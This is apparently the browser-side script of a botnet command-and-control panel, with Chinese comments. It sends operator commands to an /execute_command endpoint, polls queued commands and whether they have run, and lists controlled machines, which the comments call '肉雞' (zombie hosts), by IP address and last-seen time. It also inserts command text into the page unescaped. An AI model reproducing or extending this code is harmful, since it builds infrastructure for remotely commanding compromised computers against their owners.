function sendCommand() {
    const command = document.getElementById('commandInput').value; // 獲取用戶輸入的命令
    const userId = 1
    
    if (!command) return; // 如果命令為空，則不執行任何操作
    
    fetch('/execute_command', { // 發送 POST 請求到 /execute_command 路由
        method: 'POST',
        headers: {
            'Content-Type': 'application/json' // 設置請求的內容類型為 JSON
        },
        body: JSON.stringify({ command, user_id: userId }) // 將命令和用戶 ID 轉換為 JSON 格式
    })
    .then(response => response.json()) // 將響應轉換為 JSON
    .then(data => {
        if (data.status === 'success') { // 如果響應狀態為成功
            document.getElementById('commandInput').value = ''; // 清空輸入框
            updateCommandList(); // 更新命令列表
        }
    });
}

function updateCommandList() {
    fetch('/get_commands') // 發送 GET 請求到 /get_commands 路由
    .then(response => response.json()) // 將響應轉換為 JSON
    .then(data => {
        if (data.status === 'success') { // 如果響應狀態為成功
            const list = document.getElementById('commandList'); // 獲取命令列表的容器
            list.innerHTML = data.commands.map(cmd => ` // 遍歷命令並生成 HTML
                <div class="command-item">
                    <div>命令: ${cmd.command}</div>
                    <div>時間: ${new Date(cmd.timestamp).toLocaleString()}</div>
                    <div>狀態: ${cmd.is_run ? '已執行' : '等待執行'}</div>
                </div>
            `).join(''); // 將生成的 HTML 插入到命令列表中
        }
    });
}

function showUsers() {
    fetch('/get_users') // 發送 GET 請求到 /get_users 路由
    .then(response => response.json()) // 將響應轉換為 JSON
    .then(data => {
        if (data.status === 'success') { // 如果響應狀態為成功
            const list = document.getElementById('userList'); // 獲取肉雞列表的容器
            list.innerHTML = data.users.map(user => ` // 遍歷用戶並生成 HTML
                <div class="user-item">
                    <div>用戶名: ${user.username}</div>
                    <div>IP 地址: ${user.ip_address}</div>
                    <div>最後活動: ${new Date(user.last_seen).toLocaleString()}</div>
                </div>
            `).join(''); // 將生成的 HTML 插入到肉雞列表中
        }
    });
}

// 定期更新命令列表
setInterval(updateCommandList, 5000); // 每 5 秒更新一次命令列表
updateCommandList(); // 初始調用以加載命令列表